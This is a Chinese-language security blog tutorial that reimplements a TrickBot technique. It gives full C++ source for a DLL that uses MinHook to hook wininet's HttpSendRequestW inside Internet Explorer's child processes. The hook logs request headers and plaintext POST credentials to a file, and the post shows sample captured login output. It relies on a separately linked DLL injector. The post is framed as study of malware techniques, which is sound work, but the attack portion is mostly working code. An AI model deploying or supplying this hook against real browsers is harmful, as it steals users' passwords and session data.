# 【Day 10】穿過 IE 的巴巴 - Hook IE 竊取明文密碼

## 環境
* Windows 10 21H1
* Visual Studio 2019
* IE 11.0.19041.906

## 前情提要
在上一篇[【Day 09】Hook 的奇妙冒險 - Ring3 Hook](https://ithelp.ithome.com.tw/articles/10270919) 介紹過 Hook 的原理與幾個 Hook Library，也拿 Hook MessageBox 為例，知道 Hook 的用法。在 [【Day 05】你逆 - 逆向工程工具介紹](https://ithelp.ithome.com.tw/articles/10268000)也介紹過逆向工程的工具，這篇在講解原理時會使用到 x32dbg。

這篇要繼續延伸，開始帶入現實世界的 Malware 的攻擊技巧，講解其中的原理並實作 POC。

## TrickBot Banking Malware
TrickBot 是 2016 年出現的一支金融木馬程式，它用了很多方法去偷一些有價值的資料，包含針對各種瀏覽器的 cookie、憑證。到了最近它的功能都還有持續在更新，例如在 Microsoft Edge 瀏覽器出現後，也開始針對 Edge 攻擊；原本是針對 Windows 的惡意程式，在 2020 年甚至也支援 Linux 作業系統。

在攻擊瀏覽器方面，TrickBot 使用 Reflective DLL Injection 的技巧，也就是 Reflective Loader。接著 Hook 瀏覽器所使用的函數，藉此攔截傳輸的明文機敏資訊。

## 原理
這篇就要來實作 TrickBot 的其中一個小功能，透過 Hook IE 達到攔截明文密碼資訊，並記錄到檔案中。

### Process Explorer 觀察
打開 IE 和 proc64.exe 後，觀察一下 iexplore.exe 這個 Process。我在 IE 開了兩個 Tab，所以 iexplore.exe 下會有兩個 Child Process。
![](https://i.imgur.com/c7jC47p.png)

可以注意到其中總共有三個 iexplore.exe Process，一個是 Parent Process，下面兩個是 Child Process。往右邊看 Image Type 的地方會發現只有 Parent Process 是 64-bit，Child Process 都是 32-bit。如果 Process Explorer 預設看不到 Image Type，可以在 View => Select Columns => Process Image => Image Type 打勾。

等等要 Hook 的是 Child Process 的部分，因為它們才是真正呼叫傳送資料函數的 Process。

### x32dbg 觀察
目標函數是 wininet.dll 的 [HttpSendRequestW](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequestw)，因為目標是 32-bit Process，所以用 x32dbg Attach 後點進 Symbols 找，在左邊和右邊分別搜尋關鍵字 wininet 與 HttpSendRequestW。
![](https://i.imgur.com/PdztLKH.png)

在 HttpSendRequestExW 按下 F2 下斷點，然後在 CPU Tab 按 F9 繼續執行。接著在 IE 中隨便瀏覽任何一個網頁，以下用 [BambooFox 網站](https://bamboofox.cs.nctu.edu.tw/)舉例，順便宣傳一下 BambooFox 社群。

在 IE 中輸入網址並按下 Enter 後，可以看到 x32dbg 到了斷點的位置。這時看一下 HttpSendRequestW MSDN 對這函數的說明。其中 lpszHeaders 是 Request Header，所以在這個欄位可以看到 Hostname、網頁路徑、Cookie 等等資料；lpOptional 則通常是放 POST、PUT 參數。
```
BOOL HttpSendRequestW(
  HINTERNET hRequest,
  LPCWSTR   lpszHeaders,
  DWORD     dwHeadersLength,
  LPVOID    lpOptional,
  DWORD     dwOptionalLength
);
```

實際用 x32dbg 看看，在右邊中間的視窗有 Calling Convention 的參數，分別看第二個 lpszHeaders 和第四個 lpOptional。
![](https://i.imgur.com/Ua65YWH.png)

以上圖來看，第二個參數是 `0C802590`，左下角 Memory Dump 那邊按下 Ctrl-g 輸入這個值就可以看到 Request Header。
![](https://i.imgur.com/B31tQgI.png)

再去 [BambooFox 登入頁面](https://bamboofox.cs.nctu.edu.tw/users/sign_in)隨便輸入一組帳號密碼，送出後一樣會停在斷點。這邊我輸入帳號 user@haha.com，密碼為 password。
![](https://i.imgur.com/Qxx8UZj.png)

然後跟看第二個參數差不多，只是這次是看第四個參數，以上圖來看是 `12B3D5F0`。一樣在 Memory Dump 輸入，就可以看到明文的帳號密碼。
![](https://i.imgur.com/0LrrTrw.png)


## 實作
### 實作流程
1. 取得 wininet.dll 的 Handle
2. 從 wininet.dll 找出 HttpSendRequestW 的位址
3. Hook HttpSendRequestW，將它竄改成我們自己定義的函數。定義的函數中，會把第二個參數與第四個參數寫到檔案中，然後呼叫原本的 HtppSendRequestW
4. 啟用 Hook

### POC
程式專案可以參考我的 GitHub 專案 [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E7%A9%BF%E9%81%8EIE%E7%9A%84%E5%B7%B4%E5%B7%B4/HookIE)。
```cpp=
#include "pch.h"
#include <Windows.h>
#include "MinHook.h"
#include <WinInet.h>
#include <fstream>
#include <stdio.h>

using namespace std;

#pragma comment(lib, "libMinHook.x86.lib")

// HttpSendRequestW 的函數原型，可以從 MSDN 查到
typedef BOOL (WINAPI* HTTPSENDREQUESTW)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD);
HTTPSENDREQUESTW fpHttpSendRequestW = NULL;

// 將資訊寫入 debug.txt 檔案中
void DebugLog(wstring str) {
    wofstream file;
    file.open("C:\\debug.txt", std::wofstream::out | std::wofstream::app);
    if (file) file << str << endl << endl;
    file.close();
}

// 竄改 DetourHttpSendRequestW 的函數
BOOL WINAPI DetourHttpSendRequestW(HINTERNET hRequest,
    LPCWSTR   lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength) {
    // 第二個參數是 Request Header，把它寫入檔案中
    if (lpszHeaders) {
        DebugLog(lpszHeaders);
    }

    // 第四個參數通常是 POST、PUT 的參數，把它寫入檔案中
    if (lpOptional) {
        wchar_t  ws[1000];
        swprintf(ws, 1000, L"%hs", (char *)lpOptional);
        DebugLog(ws);
    }

    // 呼叫原本的 HttpSendRequestW
    return fpHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

int hook() {
    wchar_t log[256];

    // 1. 取得 wininet.dll 的 Handle
    HINSTANCE hDLL = LoadLibrary(L"wininet.dll");
    if (!hDLL) {
        DebugLog(L"LoadLibrary wininet.dll failed\n");
        return 1;
    }

    // 2. 從 wininet.dll 找出 HttpSendRequestW 的位址
    void* HttpSendRequestW = (void*)GetProcAddress(hDLL, "HttpSendRequestW");
    if (!HttpSendRequestW) {
        DebugLog(L"GetProcAddress HttpSendRequestW failed\n");
        return 1;
    }

    // 3. Hook HttpSendRequestW，將它竄改成我們自己定義的函數。
    //    定義的函數中，會把第二個參數與第四個參數寫到檔案中，然後呼叫原本的 HtppSendRequestW
    if (MH_Initialize() != MH_OK){
        DebugLog(L"MH_Initialize failed\n");
        return 1;
    }
    int status = MH_CreateHook(HttpSendRequestW, &DetourHttpSendRequestW, reinterpret_cast<LPVOID*>(&fpHttpSendRequestW));
    if (status != MH_OK) {
        swprintf_s(log, L"MH_CreateHook failed: Error %d\n", status);
        DebugLog(log);
        return 1;
    }

    // 4. 啟用 Hook
    status = MH_EnableHook(HttpSendRequestW);
    if (status != MH_OK) {
        swprintf_s(log, L"MH_EnableHook failed: Error %d\n", status);
        DebugLog(log);
        return 1;
    }

    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     ) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            hook();
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### 實際測試
注意要編譯成 x86 的 DLL，因為目標 Process 是 32-bit。另外這只是個 DLL，還要搭配一個 DLL Injector 才能注入到目標 Process，在[【Day 06】致不滅的 DLL - DLL Injection](https://ithelp.ithome.com.tw/articles/10268768) 有講過 DLL Injection 的實作方法，可以直接拿它改一改做使用，或是直接看我 GitHub 專案 [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E7%A9%BF%E9%81%8EIE%E7%9A%84%E5%B7%B4%E5%B7%B4/DllInjection)。

DLL Injection 成功並在網頁登入之後，產生的 debug.txt 內容大致如下，裡面可以看到我們瀏覽的網頁的 Request Header 和 POST 參數。
```
Referer: https://bamboofox.cs.nctu.edu.tw/users/sign_in
Accept-Language: en-US,en;q=0.8,zh-Hant-TW;q=0.5,zh-Hant;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

utf8=%E2%9C%93&authenticity_token=%2FNQem8B8t8EdHhE8vMobTd1jLFit7%2B6SG5qKeK3qjG319vBlzmRlT2qTSmgtNlbjYDuJ8XmY4aBFdtd7y%2BzI1w%3D%3D&user%5Bemail%5D=aaaa@aaa.aaa&user%5Bpassword%5D=bbbbbbbbbbbb&user%5Bremember_me%5D=0&commit=Log+in
```

## 參考資料
* [How TrickBot Malware Hooking Engine Targets Windows 10 Browsers](https://labs.sentinelone.com/how-trickbot-hooking-engine-targets-windows-10-browsers/)
* [鎖定Windows平臺的惡意程式TrickBot開始攻擊Linux裝置](https://www.ithome.com.tw/news/139180)
